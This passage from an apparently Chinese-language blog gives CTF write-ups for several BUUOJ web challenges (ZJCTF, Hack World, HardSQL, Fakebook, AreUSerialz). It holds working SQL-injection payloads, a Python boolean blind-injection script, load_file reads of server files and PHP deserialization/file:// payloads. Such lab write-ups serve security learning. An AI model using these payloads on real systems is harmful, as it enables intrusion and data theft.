</span></span><span class=line><span class=cl>    highlight_file(__FILE__);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>先来一段<a href=https://segmentfault.com/a/1190000018991087 target=_blank rel="noopener noreffer">PHP伪协议总结</a>，这题的第一步是判断传入text参数并读取内容，判断内容为<strong>welcome to the zjctf</strong>，使用<code>data://</code>伪协议。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,welcome to the zjctf
</span></span></code></pre></td></tr></table></div></div><p>接下来是文件包含，有了提示<code>useless.php</code>肯定要读一读看看，使用<code>php://filter</code>伪协议。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php
</span></span></code></pre></td></tr></table></div></div><p>得到的内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class Flag{  //flag.php  
</span></span><span class=line><span class=cl>    public $file;  
</span></span><span class=line><span class=cl>    public function __tostring(){  
</span></span><span class=line><span class=cl>        if(isset($this-&gt;file)){  
</span></span><span class=line><span class=cl>            echo file_get_contents($this-&gt;file); 
</span></span><span class=line><span class=cl>            echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>        return (&#34;U R SO CLOSE !///COME ON PLZ&#34;);
</span></span><span class=line><span class=cl>        }  
</span></span><span class=line><span class=cl>    }  
</span></span><span class=line><span class=cl>}  
</span></span><span class=line><span class=cl>?&gt;  
</span></span></code></pre></td></tr></table></div></div><p>并且文件包含下面有一个反序列化，又看到了<code>__tostring</code>函数，<strong>当一个对象被当作字符串对待的时候，会触发这个魔术方法</strong>。我构造的对象</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>class Flag{  
</span></span><span class=line><span class=cl>    public $file=&#34;flag.php&#34;;  
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$f = new Flag();
</span></span><span class=line><span class=cl>echo serialize($f);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=ciscn2019-华北赛区-day2-web1hack-world class=headerLink><a href=#ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day2-web1hack-world class=header-mark></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png></p><p>很明显的sql注入，随便尝试一些语句有</p><blockquote><p>1 &#187; Hello, glzjin wants a girlfriend.</p><p>2 &#187; Do you want to be my girlfriend?</p><p>3之后都是 &#187; Error Occured When Fetch Result.</p></blockquote><p>输入一个单引号<code>1'</code>出现了<code>bool(false)</code>，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。</p><p>题目中也有提示</p><blockquote><h3 id=all-you-want-is-in-table-flag-and-the-column-is-flag class=headerLink><a href=#all-you-want-is-in-table-flag-and-the-column-is-flag class=header-mark></a>All You Want Is In Table &lsquo;flag&rsquo; and the column is &lsquo;flag&rsquo;</h3></blockquote><p>说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用<code>substr</code>函数每次截取一个字符，获得其<code>ascii</code>值再使用二分法确定具体的值，最后拼接输出。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&#39;</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>high</span> <span class=o>=</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl>	<span class=n>low</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>	<span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>low</span> <span class=o>+</span> <span class=n>high</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=n>high</span><span class=o>&gt;</span><span class=n>low</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;if(ascii(substr((select	flag	from	flag),</span><span class=si>%d</span><span class=s2>,1))&gt;</span><span class=si>%d</span><span class=s2>,1,2)&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=n>payload</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=s1>&#39;Hello&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>low</span><span class=o>=</span><span class=n>mid</span><span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>high</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>		<span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>low</span><span class=o>+</span><span class=n>high</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>result</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>mid</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl><span class=c1>#flag{929c8993-2d85-4fbf-8e48-7c457551105e}</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=极客大挑战-2019hardsql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019hardsql class=header-mark></a>[极客大挑战 2019]HardSQL</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png></p><p>还是sql注入题。尝试在输入框里输入<code>#</code>、<code>--+</code>时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的<a href=https://www.cnblogs.com/wocalieshenmegui/p/5917967.html target=_blank rel="noopener noreffer">十种MySQL报错注入</a>。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用<code>()</code>隔开，具体payload如下：</p><ol><li>爆表</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=p>)</span><span class=k>where</span><span class=p>(</span><span class=n>table_schema</span><span class=p>)</span><span class=k>like</span><span class=p>(</span><span class=k>database</span><span class=p>())),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>当前表名是：H4rDsq1</p><ol start=2><li>爆字段</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=p>)</span><span class=k>where</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=k>like</span><span class=p>(</span><span class=s1>&#39;H4rDsq1&#39;</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>当前表的字段有：id,username,password</p><ol><li>出数据</li></ol><p>如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用<code>left</code>和<code>right</code>函数：</p><blockquote><p>语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)</p></blockquote><p>这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=k>left</span><span class=p>(</span><span class=n>password</span><span class=p>,</span><span class=mi>35</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>H4rDsq1</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>flag{112bb5db-17a4-47e2-97b4-19</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=k>right</span><span class=p>(</span><span class=n>password</span><span class=p>,</span><span class=mi>11</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>H4rDsq1</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>dc295a017f}</p><hr><h1 id=网鼎杯-2018fakebook class=headerLink><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2018fakebook class=header-mark></a>[网鼎杯 2018]Fakebook</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png></p><p>是一个展示自己博客网址的列表，先随便注册一个</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png></p><p>我填的是baidu的网址23333。这时的url是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1
</span></span></code></pre></td></tr></table></div></div><p>看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[<a href=https://www.cnblogs.com/kevinbruce656/p/12643338.html target=_blank rel="noopener noreffer">网鼎杯2018]fakebook题解</a>，使用了<code>load_file</code>函数直接读取了flag文件。同样是空格被过滤，但是可以使用<code>/**/</code>绕过。</p><h2 id=非预期解 class=headerLink><a href=#%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3 class=header-mark></a>非预期解</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/**/select 1,2,3,4
</span></span></code></pre></td></tr></table></div></div><p>先使用上面的语句查看回显点。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png></p><p>找的了位置2的回显点，可以把函数替换在2的位置上。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4
</span></span></code></pre></td></tr></table></div></div><p>参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣</p><h2 id=预期解 class=headerLink><a href=#%e9%a2%84%e6%9c%9f%e8%a7%a3 class=header-mark></a>预期解</h2><p>正常的sql注入一套查询，同样是使用<code>/**/</code>绕过空格过滤。</p><p>爆表</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23
</span></span></code></pre></td></tr></table></div></div><p>爆字段</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39; %23
</span></span></code></pre></td></tr></table></div></div><p>出数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users
</span></span></code></pre></td></tr></table></div></div><p>查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;guobang&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:20:&#34;http://www.baidu.com&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示<strong>the contents of his/her blog</strong>，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：<strong>使用伪协议读取flag作为blog网站回显在iframe的标签中</strong>，所以构造一个序列化对象。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>UserInfo</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span> <span class=o>=</span> <span class=s2>&#34;guobang&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span> <span class=o>=</span> <span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$blog</span> <span class=o>=</span> <span class=s2>&#34;file:///var/www/html/flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>UserInfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;guobang&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}
</span></span></span></code></pre></td></tr></table></div></div><p>最终payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1%20union/***/select%201,2,3,&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;guobang&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39; from%20users
</span></span></code></pre></td></tr></table></div></div><p>在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。</p><hr><h1 id=网鼎杯-2020-青龙组areuserialz class=headerLink><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz class=header-mark></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>部分图</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png></p><p>最下面有对于payload的限制：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>is_valid</span><span class=p>(</span><span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span> <span class=o>&gt;=</span> <span class=mi>32</span> <span class=o>&amp;&amp;</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span> <span class=o>&lt;=</span> <span class=mi>125</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>{</span><span class=s1>&#39;str&#39;</span><span class=p>}))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$str</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>is_valid</span><span class=p>(</span><span class=nv>$str</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$obj</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
